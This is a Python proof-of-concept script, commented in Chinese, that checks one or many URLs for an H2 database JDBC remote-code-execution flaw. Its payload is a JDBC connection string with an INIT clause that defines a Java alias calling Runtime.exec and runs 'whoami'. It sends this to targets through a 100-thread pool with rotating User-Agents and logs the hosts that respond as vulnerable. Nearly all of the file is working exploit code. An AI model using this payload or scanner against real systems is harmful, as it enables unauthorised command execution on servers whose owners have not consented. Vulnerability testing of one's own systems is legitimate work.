import argparse,requests,sys,random
from urllib.parse import quote
from multiprocessing.dummy import Pool

# 随机User-Agent列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
]

i=random.choice(USER_AGENTS)

def poc(target):

    try:
        # 恶意Payload
        payload = {
            "pointid": "aaa",
            "type": "sqlserver2025",
            "iscluster": "2",
            "username": "333",
            "port": "1",
            "dbname": "aaaa",
            "password": "11",
            "usepool": "1",
            "minconn": "5",
            "maxconn": "10",
            "sortid": "1",
            "id": "1",
            "operate": "test",
            "host": "abc",
            "url": "jdbc:h2:mem:test;MODE=MSSQLSERVER;INIT=CREATE ALIAS EXEC AS $$ String exec(String cmd) throws java.lang.Exception { return java.lang.Runtime.getRuntime().exec(cmd).getInputStream().toString(); } $$\\;CALL EXEC('whoami');"
        }

        # 编码URL参数
        headers = {
            "User-Agent": i,
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Connection": "close"
        }

        # 发送POST请求
        response = requests.post(url=target,data=payload,headers=headers,timeout=5,verify=False)

        # 检测响应
        if response.status_code == 200:
            if "root" in response.text or "administrator" in response.text:
                print(f"[+] 目标 {target} 存在 H2 JDBC RCE 漏洞")
                # 将漏洞目标写入文件
                with open("result2.txt", "a") as f:
                    f.write(f"{target}\n")
            else:
                print(f"[-] 目标 {target} 不存在漏洞 ")
        else:
            print(f"[*] 目标 {target} 访问异常 (状态码: {response.status_code})")

    except :
        pass

def main():
    # 命令行参数解析
    parser = argparse.ArgumentParser(
        description="H2 数据库 JDBC RCE 漏洞检测工具"
    )
    
    # 添加参数
    parser.add_argument('-u', '--url', dest='url', type=str, help="单个目标URL (例如: http://target.com/api)")
    parser.add_argument('-f', '--file', dest='file', type=str, help="包含多个目标URL的文件路径 (每行一个URL)")
    
    # 解析参数
    args = parser.parse_args()

    # 清空结果文件
    open("result2.txt", "w").close()

    # 执行检测
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        
        # 使用线程池并发检测
        pool = Pool(100)  # 10个并发线程
        pool.map(poc, url_list)
        pool.close()
        pool.join()
        
    else:
        print(f"使用方法:python {sys.argv[0]} -h")

if __name__ == '__main__':
    main()